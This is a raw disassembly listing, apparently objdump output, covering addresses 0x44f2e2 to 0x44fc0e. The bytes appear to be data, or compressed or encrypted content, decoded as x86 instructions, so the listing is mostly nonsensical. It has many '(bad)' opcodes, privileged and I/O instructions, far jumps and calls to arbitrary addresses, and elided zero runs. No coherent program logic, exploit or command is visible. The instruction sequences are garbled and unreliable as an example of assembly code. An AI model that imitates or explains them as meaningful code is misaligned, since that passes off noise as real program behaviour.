  44f2e2:	cmp    DWORD PTR [ebp-0x72ce5840],ecx
  44f2e8:	shr    BYTE PTR [edi-0x483f62d7],0x21
  44f2ef:	(bad)  
  44f2f0:	sar    BYTE PTR [edi-0x383ed2e7],0x11
  44f2f7:	sub    eax,0xc509cfc1
  44f2fc:	shr    BYTE PTR [ebx+0x0],0xb9
  44f300:	(bad)  
  44f301:	imul   edi,ebx,0xffffffff
  44f304:	xchg   esi,eax
  44f305:	leave  
  44f306:	xor    bh,BYTE PTR [ebx-0x1a]
  44f309:	jae    0x44f335
  44f30b:	jnp    0x44f2b7
  44f30d:	add    ecx,DWORD PTR ds:0xd0d3d300
  44f313:	das    
  44f314:	inc    esp
  44f315:	aad    0xce
  44f317:	xor    ebp,DWORD PTR [ecx+0x353468cf]
  44f31d:	iret   
  44f31e:	loop   0x44f353
  44f320:	mov    edx,0xbf31c0d0
  44f325:	rol    BYTE PTR [eax],cl
	...
  44f343:	add    BYTE PTR [esi],cl
  44f345:	xor    esp,DWORD PTR [ebx-0x34]
  44f348:	popa   
  44f349:	cmp    al,0x94
  44f34b:	enter  0x3bc0,0xd2
  44f34f:	enter  0x3d02,0x5
  44f353:	(bad)  
  44f354:	pop    ss
  44f355:	cmp    eax,0x3d5ec726
  44f35a:	adc    al,bh
  44f35c:	cmp    BYTE PTR [ebx],bh
  44f35e:	fs leave 
  44f360:	cwde   
  44f361:	cmp    dl,BYTE PTR [esi-0x37]
  44f364:	jb     0x44f3a0
  44f366:	mov    ebx,0xe73a9dc9
  44f36b:	arpl   WORD PTR [edx+0xd04767a],sp
  44f371:	add    bl,ch
  44f373:	rol    DWORD PTR [ecx],cl
  44f375:	xor    ch,cl
  44f377:	sar    DWORD PTR [edx],cl
  44f379:	xor    BYTE PTR [ecx],ch
  44f37b:	aam    0xec
  44f37d:	das    
  44f37e:	data16 aam 0xad
  44f381:	das    
  44f382:	sub    edx,esp
  44f384:	jns    0x44f3b5
  44f386:	aad    0xd2
  44f388:	leave  
  44f389:	cs (bad) 
  44f38c:	jl     0x44f3bc
  44f38e:	jp     0x44f365
  44f390:	outs   dx,BYTE PTR ds:[esi]
  44f391:	cs jne 0x44f364
  44f394:	call   0x33:0x34d04433
  44f39b:	push   cs
  44f39c:	push   edx
  44f39d:	loopne 0x44f3d1
  44f39f:	outs   dx,BYTE PTR ds:[esi]
  44f3a0:	dec    edx
  44f3a1:	aas    
  44f3a2:	xor    bh,BYTE PTR [edx]
  44f3a4:	inc    edx
  44f3a5:	pop    esi
  44f3a6:	xor    dl,BYTE PTR [ecx+0x0]
	...
  44f3c4:	add    BYTE PTR [eax],al
  44f3c6:	cmp    al,0xec
  44f3c8:	xor    DWORD PTR [ecx+0x7531fb3c],edx
  44f3ce:	aas    
  44f3cf:	xchg   esp,eax
  44f3d0:	xor    DWORD PTR [ebx+0x3f],ecx
  44f3d3:	mov    ds:0x3edf4331,al
  44f3d8:	xor    DWORD PTR [edi],ebx
  44f3da:	fist   WORD PTR [ebp+0x31]
  44f3dd:	add    eax,0xe53163df
  44f3e2:	fcom   QWORD PTR [edx]
  44f3e4:	xor    DWORD PTR [esi],edx
  44f3e6:	mov    esp,0xbc4130be
  44f3eb:	repz xor BYTE PTR [edx-0x43],ch
  44f3ef:	xchg   DWORD PTR [eax],esi
  44f3f1:	(bad)  
  44f3f2:	mov    ebp,0xd93537cd
  44f3f7:	(bad)  
  44f3f8:	aaa    
  44f3f9:	mov    ah,0xd6
  44f3fb:	bound  esi,QWORD PTR [esi]
  44f3fd:	mov    ebx,0xe33c02c9
  44f402:	retf   0x3bf7
  44f405:	out    0xd3,al
  44f407:	iret   
  44f408:	cmp    dl,BYTE PTR [edi]
  44f40a:	retf   0x3a9d
  44f40d:	jge    0x44f3e2
  44f40f:	sub    bh,BYTE PTR [edx]
  44f411:	adc    edi,eax
  44f413:	test   eax,0x7755c839
  44f418:	cmp    cl,ch
  44f41a:	fidivr WORD PTR [eax-0x8]
  44f41d:	popa   
  44f41e:	push   cs
  44f41f:	add    BYTE PTR [eax],al
  44f421:	in     al,dx
  44f422:	pop    esi
  44f423:	or     BYTE PTR [eax],dh
  44f425:	sar    DWORD PTR [esi],1
  44f427:	(bad)  
  44f428:	das    
  44f429:	jbe    0x44f42b
	...
  44f447:	add    BYTE PTR [esi],bh
  44f449:	lahf   
  44f44a:	das    
  44f44b:	jge    0x44f48b
  44f44d:	mov    bh,0x2f
  44f44f:	add    BYTE PTR [ecx],ah
  44f451:	dec    ebp
  44f452:	lds    esi,FWORD PTR [eax]
  44f454:	es dec ebp
  44f456:	shl    DWORD PTR [eax],1
  44f458:	sbb    ecx,DWORD PTR [ebp-0x1a]
  44f45b:	xor    BYTE PTR [esi+ecx*2],ah
  44f45e:	push   ds
  44f45f:	xor    DWORD PTR [esi+ecx*2+0x2f],edx
  44f463:	xor    DWORD PTR [ecx+0x4e],ecx
  44f466:	inc    edi
  44f467:	xor    DWORD PTR [edx+0x4e],esp
  44f46a:	push   esi
  44f46b:	xor    edi,eax
  44f46d:	dec    ebp
  44f46e:	mov    edx,0xfb4e0c31
  44f473:	xor    DWORD PTR [ebx-0x37cd47ae],ebx
  44f479:	push   ebx
  44f47a:	xor    esi,DWORD PTR [ebx]
  44f47c:	adc    eax,0x6a350e49
  44f481:	dec    edx
  44f482:	jmp    0x6d905fbd
  44f487:	cmp    dl,BYTE PTR [edi+0x103acb45]
  44f48d:	inc    ebp
  44f48e:	aaa    
  44f48f:	cmp    esp,DWORD PTR [eax+0x45]
  44f492:	sar    DWORD PTR [ebx],cl
  44f494:	rol    BYTE PTR [eax+esi*8+0x3b],cl
  44f498:	mov    edi,0x853c8440
  44f49d:	inc    edi
  44f49e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f49f:	cmp    al,0xbb
  44f4a1:	inc    edi
  44f4a2:	sub    eax,0xa346eb3d
  44f4a7:	cmp    eax,0x3e3942be
	...
  44f4c8:	add    BYTE PTR [eax],al
  44f4ca:	dec    ecx
  44f4cb:	inc    edx
  44f4cc:	sar    BYTE PTR [esi],1
  44f4ce:	mov    al,0x41
  44f4d0:	pop    ds
  44f4d1:	aas    
  44f4d2:	and    DWORD PTR [ecx+0x6f],eax
  44f4d5:	aas    
  44f4d6:	jecxz  0x44f518
  44f4d8:	fdivr  QWORD PTR [edi]
  44f4da:	sti    
  44f4db:	inc    eax
  44f4dc:	clc    
  44f4dd:	jmp    DWORD PTR [esp+edi*1-0x8]
  44f4e1:	call   DWORD PTR [ebx+eax*1-0x51f30000]
  44f4e8:	int3   
  44f4e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f4ea:	sbb    eax,0x1c66d42a
  44f4ef:	push   edx
  44f4f0:	rol    DWORD PTR [ebx-0x462d8104],cl
  44f4f6:	cld    
  44f4f7:	psrlq  mm1,QWORD PTR [esi]
  44f4fa:	push   DWORD PTR [ebx-0x32]
  44f4fd:	cmp    eax,0xa8cdedff
  44f502:	fild   WORD PTR [esi]
  44f504:	into   
  44f505:	out    dx,al
  44f506:	fistp  WORD PTR [edi-0x33]
  44f509:	sub    al,0xde
  44f50b:	pushf  
  44f50c:	int    0x66
  44f50e:	faddp  st(4),st
  44f510:	int3   
  44f511:	cmp    BYTE PTR [ecx-0x65],al
  44f514:	enter  0x3971,0x75
  44f518:	enter  0x4017,0xab
  44f51c:	iret   
  44f51d:	push   0x7bced438
  44f522:	and    al,ch
  44f524:	iret   
  44f525:	mov    bl,BYTE PTR [eax]
  44f527:	fs retf 0x2304
  44f52b:	(bad)  
  44f52c:	leave  
  44f52d:	xchg   BYTE PTR [eax],al
	...
  44f54b:	add    BYTE PTR [ebx],bl
  44f54d:	ss leave 
  44f54f:	nop
  44f550:	add    ah,BYTE PTR [edi]
  44f552:	int3   
  44f553:	call   0x6af4:0x8bc4ee05
  44f55a:	lds    edx,FWORD PTR [eax]
  44f55c:	test   BYTE PTR [ebx-0x3b],0xa7
  44f560:	out    0xe2,al
  44f562:	(bad)
  44f565:	xchg   ebp,eax
  44f566:	lds    edx,FWORD PTR [eax]
  44f568:	fld    DWORD PTR [eax-0x40]
  44f56b:	xor    ecx,edx
  44f56d:	adc    al,0xc8
  44f56f:	pop    ebx
  44f570:	dec    ecx
  44f571:	add    ecx,eax
  44f573:	mov    BYTE PTR [ecx-0x2c],al
  44f576:	rcr    BYTE PTR [esi],0x38
  44f579:	mov    dh,0xc7
  44f57b:	xor    BYTE PTR [eax],0x0
  44f57e:	mov    eax,cs
  44f580:	mov    ds:0x43c82735,eax
  44f585:	xor    eax,0x35fcc83f
  44f58a:	mov    bl,0xc5
  44f58c:	jmp    0x1236:0x85c56435
  44f593:	(bad)
  44f596:	test   al,0xc6
  44f598:	mov    al,0x36
  44f59a:	xor    eax,0xe7373ac6
  44f59f:	mov    bl,0x2a
  44f5a1:	ja     0x44f54d
  44f5a3:	add    ecx,DWORD PTR ds:0xe0d3c900
  44f5a9:	das    
  44f5aa:	scas   eax,DWORD PTR es:[edi]
  44f5ab:	shl    DWORD PTR [edi+0xd3552f],cl
	...
  44f5cd:	add    BYTE PTR [esi-0x62cb9d1],ah
  44f5d3:	das    
  44f5d4:	retf   0x3dd4
  44f5d7:	xor    DWORD PTR ds:0x603221d4,esi
  44f5dd:	ror    BYTE PTR [edi+0x33],cl
  44f5e0:	in     eax,dx
  44f5e1:	iret   
  44f5e2:	dec    esi
  44f5e3:	sub    al,0x42
  44f5e5:	ror    BYTE PTR [esi+0x2d],1
  44f5e8:	cmp    ecx,edi
  44f5ea:	jno    0x44f618
  44f5ec:	scas   al,BYTE PTR es:[edi]
  44f5ed:	iret   
  44f5ee:	mov    ecx,0xd4ce582c
  44f5f3:	cs pushf 
  44f5f5:	int    0xbf
  44f5f7:	cs ss int3 
  44f5fa:	lahf   
  44f5fb:	cmp    BYTE PTR [edx+0x663b08cb],bl
  44f601:	leave  
  44f602:	sub    al,0x34
  44f604:	mov    edx,0xe73630c7
  44f609:	mov    ds:0x3c67692,eax
  44f60e:	or     eax,0xe1d2d700
  44f613:	add    BYTE PTR cs:[ebx],al
  44f616:	dec    eax
  44f617:	fbstp  TBYTE PTR [edi]
  44f619:	inc    DWORD PTR [esi-0x6b]
  44f61c:	ss xchg ecx,eax
  44f61e:	push   esi
  44f61f:	cs cmp al,0x1e
  44f622:	push   ebp
  44f623:	sahf   
  44f624:	cmp    DWORD PTR [esi-0x16c69dad],eax
  44f62a:	jle    0x44f6a2
  44f62c:	clc    
  44f62d:	std    
  44f62e:	push   cs
  44f62f:	add    BYTE PTR [eax],al
  44f631:	retf   0x0
	...
  44f650:	pop    esp
  44f651:	js     0x44f685
  44f653:	nop
  44f654:	dec    eax
  44f655:	outs   dx,DWORD PTR ds:[esi]
  44f656:	xor    eax,edx
  44f658:	inc    ecx
  44f659:	into   
  44f65a:	xor    BYTE PTR [eax+ebx*2+0x50],bh
  44f65e:	xor    bh,bh
  44f660:	push   esi
  44f661:	aam    0x37
  44f663:	dec    esi
  44f664:	dec    ecx
  44f665:	pop    esi
  44f666:	aaa    
  44f667:	cdq    
  44f668:	inc    edi
  44f669:	add    BYTE PTR [esi],dh
  44f66b:	or     dl,bh
  44f66d:	add    DWORD PTR ds:0x347ed5b9,esi
  44f673:	and    al,ah
  44f675:	push   esp
  44f676:	xor    al,0xe6
  44f678:	retf   0xf875
  44f67b:	jmp    0x123d6b8e
  44f680:	push   cs
  44f681:	add    BYTE PTR [eax],al
  44f683:	inc    eax
  44f684:	shl    esp,0x2e
  44f687:	mov    di,0x2e7c
  44f68b:	jbe    0x44f66c
  44f68d:	test   BYTE PTR [esi],ch
  44f68f:	push   esi
  44f690:	fisttp WORD PTR [esi+ebp*1+0x2e94df56]
  44f697:	xchg   bh,bl
  44f699:	pushf  
  44f69a:	cs push esi
  44f69c:	mov    edi,0xbf562ea4
  44f6a1:	lods   al,BYTE PTR ds:[esi]
  44f6a2:	cs push esi
  44f6a4:	mov    edi,0xbfa62eb4
  44f6a9:	cmp    al,0x2e
  44f6ab:	add    bl,al
  44f6ad:	push   edx
  44f6ae:	retf   
  44f6af:	xor    DWORD PTR [ebx+0x31d352],ebx
	...
  44f6d1:	add    BYTE PTR [ebx-0x74ce24ae],ah
  44f6d7:	push   edx
  44f6d8:	jecxz  0x44f70b
  44f6da:	ret    
  44f6db:	push   ecx
  44f6dc:	jmp    0x44f70f
  44f6de:	mov    ebx,0xc331f351
  44f6e3:	push   ecx
  44f6e4:	sti    
  44f6e5:	xor    DWORD PTR [ebx+0x4f],ebp
  44f6e8:	add    esi,DWORD PTR [edx]
  44f6ea:	inc    ebx
  44f6eb:	dec    edi
  44f6ec:	or     esi,DWORD PTR [edx]
  44f6ee:	pop    ebx
  44f6ef:	dec    edi
  44f6f0:	adc    esi,DWORD PTR [edx]
  44f6f2:	arpl   WORD PTR [edi+0x1b],cx
  44f6f5:	xor    cl,BYTE PTR [ebx]
  44f6f7:	push   edx
  44f6f8:	and    esi,DWORD PTR [edx]
  44f6fa:	inc    ebx
  44f6fb:	dec    edi
  44f6fc:	sub    esi,DWORD PTR [edx]
  44f6fe:	cmp    ecx,DWORD PTR [edi+0x33]
  44f701:	xor    al,BYTE PTR [ebx+0x4f]
  44f704:	cmp    esi,DWORD PTR [edx]
  44f706:	imul   ecx,DWORD PTR [edi+0x43],0x32
  44f70a:	ret    
  44f70b:	dec    esi
  44f70c:	dec    ebx
  44f70d:	xor    bl,BYTE PTR [ebx-0x5ccdacb2]
  44f713:	dec    esi
  44f714:	pop    ebx
  44f715:	xor    cl,BYTE PTR [ebx+0x4332634e]
  44f71b:	imul   esi,DWORD PTR cs:[edx],0x3b
  44f71f:	cs jae 0x44f754
  44f722:	inc    ebx
  44f723:	cs jnp 0x44f758
  44f726:	imul   ebp,DWORD PTR [esi],0xffffff83
  44f729:	xor    al,BYTE PTR [ebx+0x2e]
  44f72c:	mov    esi,DWORD PTR [edx]
  44f72e:	pop    ebx
  44f72f:	cs xchg ebx,eax
  44f731:	xor    ah,BYTE PTR [ebx+0x2e]
  44f734:	fwait
  44f735:	xor    al,BYTE PTR [eax]
	...
  44f753:	add    BYTE PTR [ebx-0x24cce4d3],cl
  44f759:	sub    eax,0x2dd33323
  44f75e:	sub    esi,DWORD PTR [ebx]
  44f760:	or     eax,0xde353156
  44f765:	inc    ebp
  44f766:	xor    DWORD PTR ds:0x4531263e,edi
  44f76c:	ds xor DWORD PTR es:[ebp+0x3e],ecx
  44f771:	push   ss
  44f772:	xor    DWORD PTR [ebp+0x3e],edx
  44f775:	push   es
  44f776:	xor    DWORD PTR [ebp+0x1e],ebx
  44f779:	inc    esi
  44f77a:	xor    DWORD PTR [ebp+0x1e],esp
  44f77d:	inc    esi
  44f77e:	xor    DWORD PTR [ebp+0x1e],ebp
  44f781:	push   esi
  44f782:	xor    DWORD PTR [ebp+0x1e],esi
  44f785:	inc    esi
  44f786:	xor    DWORD PTR [ebp-0x2],edi
  44f789:	in     eax,0x30
  44f78b:	test   esi,edi
  44f78d:	in     eax,0x30
  44f78f:	(bad)  
  44f790:	(bad)  
  44f791:	aad    0x30
  44f793:	xchg   ebp,eax
  44f794:	inc    ch
  44f796:	xor    BYTE PTR [ebp-0x5acf3a22],bl
  44f79c:	faddp  st(5),st
  44f79e:	xor    BYTE PTR [ebp-0x4acf2a22],ch
  44f7a4:	faddp  st(5),st
  44f7a6:	xor    BYTE PTR [ebp-0x3aceddc2],bh
  44f7ac:	and    dh,BYTE PTR ds:[ecx]
  44f7af:	int    0x3e
  44f7b1:	adc    dh,BYTE PTR [ecx]
  44f7b3:	aad    0x3e
  44f7b5:	add    dh,BYTE PTR [ecx]
  44f7b7:	test   BYTE PTR [eax],al
	...
  44f7d5:	add    BYTE PTR [ecx],ah
  44f7d7:	cmp    DWORD PTR [esi],esi
  44f7d9:	xchg   DWORD PTR [edi],esp
  44f7db:	push   esi
  44f7dc:	cmp    cl,BYTE PTR [ebx]
  44f7de:	push   ss
  44f7df:	xor    DWORD PTR [ecx],edi
  44f7e1:	pop    ebx
  44f7e2:	push   ss
  44f7e3:	mov    ebx,0x7c06b338
  44f7e8:	cmp    ebx,ecx
  44f7ea:	push   es
  44f7eb:	mov    eax,ds:0x88f95c39
  44f7f0:	cmp    BYTE PTR [eax+0x353dfcf1],bh
  44f7f6:	jmp    0x44f7f7
  44f7f8:	inc    edx
  44f7f9:	inc    edx
  44f7fa:	xor    BYTE PTR [edx],dh
  44f7fc:	out    dx,al
  44f7fd:	inc    edx
  44f7fe:	(bad)  
  44f7ff:	xor    esp,edi
  44f801:	adc    edx,DWORD PTR [edx+0xd03fa73]
  44f807:	add    BYTE PTR [eax],ah
  44f809:	xor    al,0xf3
  44f80b:	das    
  44f80c:	jg     0x44f843
  44f80e:	adc    BYTE PTR [edi],ch
  44f810:	add    dh,BYTE PTR [edi]
  44f812:	test   DWORD PTR [edi],ebp
  44f814:	aas    
  44f815:	ss mov eax,0x3136422f
  44f81b:	sub    al,0x64
  44f81d:	aaa    
  44f81e:	scas   al,BYTE PTR es:[edi]
  44f81f:	sub    al,0x95
  44f821:	aaa    
  44f822:	xchg   ecx,eax
  44f823:	sub    al,0x24
  44f825:	aaa    
  44f826:	pop    ecx
  44f827:	sub    al,0x4a
  44f829:	aaa    
  44f82a:	and    BYTE PTR ds:0x2a0638fc,ch
  44f830:	sar    DWORD PTR [ecx],cl
  44f832:	mov    esp,0x7d396029
  44f837:	sub    al,BYTE PTR [edi+0x39]
	...
  44f856:	add    BYTE PTR [eax],al
  44f858:	dec    ebp
  44f859:	sub    ch,BYTE PTR [esi]
  44f85b:	cmp    DWORD PTR [edx+0x38],edi
  44f85e:	mov    ds:0xee39773c,al
  44f863:	cmp    eax,0x3e2d3771
  44f868:	in     al,0x36
  44f86a:	fstp   TBYTE PTR [edi]
  44f86c:	das    
  44f86d:	xor    al,0x2c
  44f86f:	aas    
  44f870:	outs   dx,BYTE PTR ds:[esi]
  44f871:	xor    eax,0x34a0404e
  44f876:	mov    bh,0x3f
  44f878:	out    dx,eax
  44f879:	xor    al,0xf2
  44f87b:	inc    eax
  44f87c:	div    DWORD PTR [edx]
  44f87e:	or     eax,DWORD PTR [ecx+0x1d]
  44f881:	xor    esp,DWORD PTR [ecx+eax*2]
  44f884:	cmp    esi,DWORD PTR [ebx]
  44f886:	inc    eax
  44f887:	inc    ecx
  44f888:	aam    0x32
  44f88a:	out    0x23,eax
  44f88c:	mov    edx,0x980ff72
  44f891:	add    BYTE PTR [eax],al
  44f893:	loop   0x44f873
  44f895:	pop    ss
  44f896:	xor    cl,ah
  44f898:	fidivr WORD PTR [ebx-0x6a1ee9d1]
  44f89e:	das    
  44f89f:	dec    esi
  44f8a0:	fldcw  WORD PTR [ebp+0x283ff02f]
  44f8a6:	das    
  44f8a7:	(bad)  
  44f8a8:	aas    
  44f8a9:	imul   DWORD PTR [esi]
  44f8ab:	push   eax
  44f8ac:	bound  ebp,QWORD PTR ds:[esi]
  44f8af:	mov    edx,0x672dd538
  44f8b4:	and    ebx,DWORD PTR [ecx-0x59e471d3]
  44f8ba:	sub    eax,0x95
	...
  44f8d7:	add    BYTE PTR [eax],al
  44f8d9:	add    BYTE PTR [ebx],ah
  44f8db:	mov    ah,0x2d
  44f8dd:	sub    ebx,DWORD PTR [ebx]
  44f8df:	dec    eax
  44f8e0:	sub    eax,0x2d4e031f
  44f8e5:	and    eax,0x522d5efb
  44f8ea:	add    ebp,DWORD PTR [ebp+ebp*1+0x32]
  44f8ee:	sti    
  44f8ef:	jmp    FWORD PTR [ebx+eax*1]
  44f8f2:	loopne 0x44f915
  44f8f4:	sub    eax,0x2d38d9e0
  44f8f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f8fa:	loope  0x44f8c2
  44f8fc:	sub    al,0xba
  44f8fe:	fxch   st(2)
  44f900:	sub    al,0x88
  44f902:	inc    ecx
  44f903:	fild   QWORD PTR [ecx+edi*2]
  44f906:	cmp    esi,ebp
  44f908:	sub    al,0x7e
  44f90a:	inc    ecx
  44f90b:	jle    0x44f939
  44f90d:	bound  edi,QWORD PTR [eax]
  44f90f:	push   edx
  44f910:	sub    al,0xb1
  44f912:	and    al,dh
  44f914:	xor    ecx,DWORD PTR [esi+0x25]
  44f917:	popa   
  44f918:	xor    eax,DWORD PTR [eax+0x22]
  44f91b:	in     eax,dx
  44f91c:	xor    dl,BYTE PTR [esi+0x1a]
  44f91f:	push   0x32
  44f921:	dec    ecx
  44f922:	pop    es
  44f923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f924:	xor    BYTE PTR [eax],al
  44f926:	outs   dx,BYTE PTR ds:[esi]
  44f927:	cmp    bh,bl
  44f929:	aaa    
  44f92a:	fdiv   DWORD PTR ds:0x36a0385e
  44f930:	cmp    DWORD PTR es:[edi+0x35],edx
  44f934:	das    
  44f935:	cmp    esp,esi
  44f937:	xor    dh,BYTE PTR [ecx+0x3b]
  44f93a:	shl    BYTE PTR [ecx],0xf9
  44f93d:	cmp    al,0x0
	...
  44f95b:	add    BYTE PTR [ebx+0x32],ch
  44f95e:	aaa    
  44f95f:	sub    bh,BYTE PTR ds:[esi-0x41e2c1aa]
  44f966:	lods   al,BYTE PTR ds:[esi]
  44f967:	ds clc 
  44f969:	mov    esi,0xc05d3f06
  44f96e:	lock aas 
  44f970:	je     0x44f99f
  44f972:	stc    
  44f973:	jmp    esp
  44f975:	cld    
  44f976:	(bad)  
  44f977:	push   DWORD PTR [edx+0x2e]
  44f97a:	add    eax,0xcd2cf431
  44f97f:	xor    ebx,esp
  44f981:	sub    eax,0x297c32c4
  44f986:	data16 xor al,0x8b
  44f989:	sub    ebp,ecx
  44f98b:	xor    al,0x52
  44f98d:	sub    cl,BYTE PTR [edi+0x4729f635]
  44f993:	ss dec eax
  44f995:	aaa    
  44f996:	jp     0x44f9ce
  44f998:	lea    esi,[edi]
  44f99a:	mov    al,ds:0x33381436
  44f99f:	aaa    
  44f9a0:	jg     0x44f9da
  44f9a2:	inc    eax
  44f9a3:	cmp    BYTE PTR [eax+0x3d389e35],al
  44f9a9:	xor    eax,0x35a83907
  44f9ae:	mov    WORD PTR [ecx],?
  44f9b0:	inc    ebp
  44f9b1:	ss (bad) 
  44f9b3:	cmp    DWORD PTR [edi-0x22c638ce],eax
  44f9b9:	ss cmp eax,0x35d00d3a
  44f9bf:	test   DWORD PTR [eax],eax
	...
  44f9dd:	add    BYTE PTR [edi],al
  44f9df:	out    dx,al
  44f9e0:	xor    eax,0x35f607a5
  44f9e5:	aad    0xf7
  44f9e7:	mov    bh,0x35
  44f9e9:	div    bh
  44f9eb:	push   ecx
  44f9ec:	xor    eax,0x3560e62c
  44f9f1:	pop    esp
  44f9f2:	out    0x5,al
  44f9f4:	xor    eax,0x3517d667
  44f9f9:	jno    0x44f9d1
  44f9fb:	div    BYTE PTR [eax+ebx*4]
  44f9fe:	inc    esi
  44f9ff:	fdiv   DWORD PTR [edx+edx*1]
  44fa02:	inc    ecx
  44fa03:	dec    eax
  44fa04:	cmp    BYTE PTR [ecx+0x39],cl
  44fa07:	ja     0x44fa41
  44fa09:	fs xor ch,bl
  44fa0c:	fsubr  DWORD PTR ds:[eax]
  44fa0f:	ins    DWORD PTR es:[edi],dx
  44fa10:	cmp    ah,BYTE PTR [eax-0x33c5d7dd]
  44fa16:	sbb    ebx,eax
  44fa18:	cmp    DWORD PTR [ecx],ebx
  44fa1a:	adc    bh,ch
  44fa1c:	cmp    BYTE PTR [eax],al
  44fa1e:	or     eax,0x42febc67
  44fa23:	mov    dl,0xfc
  44fa25:	dec    DWORD PTR ds:0xfda32caf
  44fa2b:	inc    ebx
  44fa2c:	xor    eax,DWORD PTR [esp+ebx*8-0x232ecce5]
  44fa33:	popa   
  44fa34:	cs dec edi
  44fa36:	fild   WORD PTR [esi+ebp*1]
  44fa39:	(bad)  
  44fa3a:	fisttp WORD PTR [esi+0x2d]
  44fa3d:	mov    DWORD PTR [esi],edi
  44fa3f:	push   ds
  44fa40:	sub    eax,0x69
	...
  44fa5d:	add    BYTE PTR [eax],al
  44fa5f:	add    BYTE PTR [ecx],bh
  44fa61:	mov    ebp,0xc9438837
  44fa66:	xor    ah,bl
  44fa68:	cmp    bh,dh
  44fa6a:	xor    cl,dh
  44fa6c:	and    ch,BYTE PTR [ebx+0x253534]
  44fa72:	mov    WORD PTR [ebx],?
  44fa74:	shr    DWORD PTR [eax],1
  44fa76:	mov    edi,0xf528d83b
  44fa7b:	cmp    al,0xf5
  44fa7d:	sub    BYTE PTR [edi*1+0x3c742966],bl
  44fa84:	outs   dx,BYTE PTR ds:[esi]
  44fa85:	sub    ebx,eax
  44fa87:	cmp    al,0xb2
  44fa89:	sub    esi,ebx
  44fa8b:	cmp    DWORD PTR [eax],ebx
  44fa8d:	sub    cl,ch
  44fa8f:	cmp    ecx,esp
  44fa91:	sub    DWORD PTR [edx],ebp
  44fa93:	cmp    bh,BYTE PTR [edx+ebp*1]
  44fa96:	adc    BYTE PTR [edx],bh
  44fa98:	sub    DWORD PTR [edx],0x58
  44fa9b:	cmp    DWORD PTR [ebp+0x2a],ecx
  44fa9e:	fwait
  44fa9f:	cmp    DWORD PTR [edx+0x2a],edx
  44faa2:	cdq    
  44faa3:	cmp    DWORD PTR [edx-0x2dbedad5],edi
  44faa9:	sub    eax,0x2edd3f15
  44faae:	jmp    0x5bd3:0xe7000d3e
  44fab5:	outs   dx,DWORD PTR ds:[esi]
  44fab6:	into   
  44fab7:	add    ecx,DWORD PTR ds:0xa4347f00
  44fabd:	xor    al,BYTE PTR [ebp+0x31]
  44fac0:	les    esi,FWORD PTR [edx]
  44fac2:	jo     0x44faf6
	...
  44fae0:	add    BYTE PTR [eax],al
  44fae2:	xchg   DWORD PTR [ebx],esi
  44fae4:	push   ebx
  44fae5:	xor    dl,BYTE PTR [edi+0x33]
  44fae8:	dec    ebx
  44fae9:	xor    ah,BYTE PTR [ebp-0x1ec7becc]
  44faef:	xor    eax,0x36703597
  44faf4:	xor    BYTE PTR [esi],0x63
  44faf7:	aaa    
  44faf8:	fwait
  44faf9:	cmp    eax,DWORD PTR [eax-0x6ec497d8]
  44faff:	daa    
  44fb00:	dec    ebx
  44fb01:	cmp    edi,DWORD PTR [ebx-0xac4d6d9]
  44fb07:	daa    
  44fb08:	add    bh,bl
  44fb0a:	sub    edx,eax
  44fb0c:	ss xchg ebx,eax
  44fb0e:	and    DWORD PTR [esi],esp
  44fb10:	xor    eax,0x34681468
  44fb15:	out    0x12,al
  44fb17:	or     bh,BYTE PTR [edx+eiz*8]
  44fb1a:	or     ecx,ebx
  44fb1c:	cmp    bl,BYTE PTR [ebx+0x2]
  44fb1f:	xchg   ebx,eax
  44fb20:	cmp    al,ah
  44fb22:	cli    
  44fb23:	fnstcw WORD PTR [eax]
  44fb25:	xor    eax,0x7c3899f0
  44fb2a:	call   0xe0e23370
  44fb2f:	push   ebx
  44fb30:	cmp    dh,al
  44fb32:	fdiv   DWORD PTR [ebx+0x38]
  44fb35:	mov    ds:0xe8ffffd0,eax
  44fb3a:	outs   dx,BYTE PTR ds:[esi]
  44fb3b:	ins    DWORD PTR es:[edi],dx
  44fb3c:	clc    
  44fb3d:	sbb    DWORD PTR [ecx],ecx
  44fb3f:	add    BYTE PTR [eax],al
  44fb41:	xchg   edi,eax
  44fb42:	inc    ecx
  44fb43:	push   ss
  44fb44:	das    
  44fb45:	mov    ch,0x0
	...
  44fb63:	add    BYTE PTR [edi],bh
  44fb65:	xor    eax,0xdc1e142f
  44fb6a:	cs pop edx
  44fb6c:	push   ds
  44fb6d:	push   esp
  44fb6e:	cs push edi
  44fb70:	push   ds
  44fb71:	adc    ch,BYTE PTR [esi]
  44fb73:	or     eax,0xa92e321f
  44fb78:	cld    
  44fb79:	cmp    eax,0xd0fc172d
  44fb7e:	sub    al,0xa6
  44fb80:	std    
  44fb81:	js     0x44fbaf
  44fb83:	icebp  
  44fb84:	cli    
  44fb85:	sbb    esi,DWORD PTR [ecx+ebp*4]
  44fb88:	loop   0x44fb7c
  44fb8a:	xor    esp,DWORD PTR [ecx-0x1b]
  44fb8d:	xchg   esi,eax
  44fb8e:	xor    edi,DWORD PTR ds:0x153357d5
  44fb94:	aad    0x74
  44fb96:	xor    esp,esp
  44fb98:	inc    ebx
  44fb99:	pop    es
  44fb9a:	xor    edx,ebx
  44fb9c:	cmp    ecx,esp
  44fb9e:	xor    al,BYTE PTR [eax]
  44fba0:	mov    edx,0x3f366333
  44fba5:	xor    esi,DWORD PTR [esi]
  44fba7:	cmp    BYTE PTR [edi+0x2f38b529],ch
  44fbad:	sub    al,0x19
  44fbaf:	cmp    DWORD PTR ds:0xe2398129,edi
  44fbb5:	daa    
  44fbb6:	sub    bh,BYTE PTR [edx]
  44fbb8:	stc    
  44fbb9:	sub    DWORD PTR [esi+0x3a],ebx
  44fbbc:	data16 sub al,BYTE PTR [ebx-0xd85cc6]
  44fbc3:	cmp    cl,BYTE PTR [edx]
  44fbc5:	daa    
	...
  44fbe6:	mov    ah,0x71
  44fbe8:	stc    
  44fbe9:	dec    DWORD PTR [eax]
  44fbeb:	add    al,0x0
  44fbed:	add    bl,dl
  44fbef:	sub    ebp,edx
  44fbf1:	cmp    dl,dl
  44fbf3:	mov    edi,0x2d023c67
  44fbf8:	mov    ah,0x3d
  44fbfa:	mov    eax,0x8d3df02e
  44fbff:	cs push ds
  44fc01:	ds in  al,dx
  44fc03:	sub    al,bl
  44fc05:	lea    ebp,ds:[eax+eax*1]
  44fc09:	add    BYTE PTR [ecx+eax*4-0x7],dh
  44fc0d:	(bad)  
  44fc0e:	cmp    BYTE PTR [ecx],al
